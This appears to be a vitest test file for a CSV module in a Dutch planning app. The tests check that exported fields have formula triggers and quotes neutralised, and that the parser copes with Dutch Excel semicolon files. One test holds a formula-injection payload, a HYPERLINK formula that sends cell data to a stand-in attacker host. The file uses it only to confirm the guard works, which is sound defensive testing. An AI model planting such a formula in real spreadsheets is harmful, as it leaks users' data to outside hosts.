import { describe, it, expect } from 'vitest';
import { csvField, parseCsv } from './csv';

/**
 * The hard rule: nothing that leaves here can act as anything other than
 * text.
 *
 * The preferences backups are written to be opened in a spreadsheet, and
 * the fields going into them are planner-entered free text (codenaam,
 * period name). Two things can escape a CSV cell: a leading character
 * that makes the cell a formula, and an unescaped quote that ends the
 * field early and lets the rest be read as more columns. (The downloads
 * are workbooks since 0.20.0, lib/xlsxWrite.test.ts.)
 */

describe('csvField', () => {
  it('quotes an ordinary value', () => {
    expect(csvField('Persoon-01')).toBe('"Persoon-01"');
  });

  it('doubles an embedded quote, per RFC 4180', () => {
    // Without this the field ends at the first quote and everything after
    // it is read as further columns.
    expect(csvField('Persoon "de nachtwacht" 01')).toBe('"Persoon ""de nachtwacht"" 01"');
  });

  it('neutralises every character that starts a formula', () => {
    // =, +, - and @ each make a cell a formula in Excel, Numbers and
    // Sheets; tab and CR are treated the same way by some of them.
    for (const trigger of ['=', '+', '-', '@', '\t', '\r']) {
      const field = csvField(`${trigger}SUM(A1:A9)`);
      expect(field.startsWith(`"'${trigger}`), JSON.stringify(trigger)).toBe(true);
    }
  });

  it('neutralises the classic exfiltration one-liner', () => {
    const field = csvField('=HYPERLINK("http://evil.example?x="&A1,"klik hier")');
    expect(field.startsWith(`"'=`)).toBe(true);
    // The guard and the quote escaping have to both apply, not one or the
    // other.
    expect(field).toContain('""http://evil.example');
  });

  it('leaves a trigger character alone when it is not at the start', () => {
    // "Persoon-01" must not gain an apostrophe; only a *leading* trigger
    // turns a cell into a formula.
    expect(csvField('Persoon-01')).toBe('"Persoon-01"');
    expect(csvField('2027-1')).toBe('"2027-1"');
    expect(csvField('a+b')).toBe('"a+b"');
  });

  it('renders null, undefined and numbers the way the exports expect', () => {
    expect(csvField(null)).toBe('""');
    expect(csvField(undefined)).toBe('""');
    expect(csvField(0)).toBe('"0"');
    expect(csvField(42)).toBe('"42"');
  });

  it('guards a negative number too, since it starts with a minus', () => {
    // Deliberately true: a bare -1 in a cell is a formula as far as a
    // spreadsheet is concerned. The exports show balances in words
    // anyway (CLAUDE.md), so nothing legitimate depends on -1 staying
    // numeric here.
    expect(csvField(-1)).toBe(`"'-1"`);
  });
});

describe('parseCsv', () => {
  /**
   * The hard rule this side of the module exists for: a plain split(',')
   * would cut a quoted field's own embedded comma into two cells,
   * silently misaligning every column after it for the rest of the row -
   * exactly what happens to a codenaam or note round-tripped through
   * Excel as `"foo, bar"`.
   */
  it('does not split a comma inside a quoted field', () => {
    expect(parseCsv('a,"b, c",d')).toEqual([['a', 'b, c', 'd']]);
  });

  it('un-escapes a doubled quote inside a quoted field, per RFC 4180', () => {
    expect(parseCsv('a,"she said ""hi""",b')).toEqual([['a', 'she said "hi"', 'b']]);
  });

  it('treats a quote that is not at the very start of a cell as a literal character', () => {
    // A stray `"` typed mid-field (e.g. Persoon"05) must not open quoted
    // mode and swallow the next comma as part of the field.
    expect(parseCsv('Persoon"05,x')).toEqual([['Persoon"05', 'x']]);
  });

  it('splits into rows on both \\n and \\r\\n, skipping blank lines', () => {
    expect(parseCsv('a,b\r\nc,d\n\ne,f')).toEqual([
      ['a', 'b'],
      ['c', 'd'],
      ['e', 'f'],
    ]);
  });

  it('trims whitespace around unquoted cells', () => {
    expect(parseCsv(' a , b ,c')).toEqual([['a', 'b', 'c']]);
  });
});

describe('parseCsv: a line break inside a quoted cell', () => {
  it('stays one cell, in a comma file and in a semicolon file', () => {
    expect(parseCsv('a,b\n"x\ny",z')).toEqual([['a', 'b'], ['x\ny', 'z']]);
    expect(parseCsv('a;b\r\n"x\r\ny";z\r\n')).toEqual([['a', 'b'], ['x\r\ny', 'z']]);
  });

  it('still splits at a line break after a closed quote', () => {
    expect(parseCsv('"a","b"\n"c","d"')).toEqual([['a', 'b'], ['c', 'd']]);
    expect(parseCsv('"a ""quoted"" b"\nnext')).toEqual([['a "quoted" b'], ['next']]);
  });
});

describe('parseCsv on a file saved by a Dutch Excel', () => {
  /**
   * Audit 12: a Dutch Excel saves "CSV" with semicolons (the list
   * separator of Dutch regional settings) and "CSV UTF-8" with a byte order
   * mark. The beginsaldi in the setup wizard and the "Eerdere
   * toewijzingen" import read only commas: every line became one cell,
   * every codenaam "unknown" - for the beginsaldi only after the period
   * had opened. The separator is now the one the header line uses.
   */
  it('reads semicolons when the header has them', () => {
    expect(parseCsv('codenaam;AVOND_delta;WEEKEND_delta\r\nPersoon-01;-1;0\r\nPersoon-02;0;2')).toEqual([
      ['codenaam', 'AVOND_delta', 'WEEKEND_delta'],
      ['Persoon-01', '-1', '0'],
      ['Persoon-02', '0', '2'],
    ]);
  });

  it('keeps a semicolon inside quotes and drops the byte order mark', () => {
    expect(parseCsv('﻿"datum";"teller";"codenaam"\n"2027-01-03";"Avond";"Persoon; 05"')).toEqual([
      ['datum', 'teller', 'codenaam'],
      ['2027-01-03', 'Avond', 'Persoon; 05'],
    ]);
  });

  it('still reads commas, and a comma file whose names hold a semicolon', () => {
    expect(parseCsv('codenaam,AVOND_delta\nPersoon;01,1')).toEqual([
      ['codenaam', 'AVOND_delta'],
      ['Persoon;01', '1'],
    ]);
  });
});
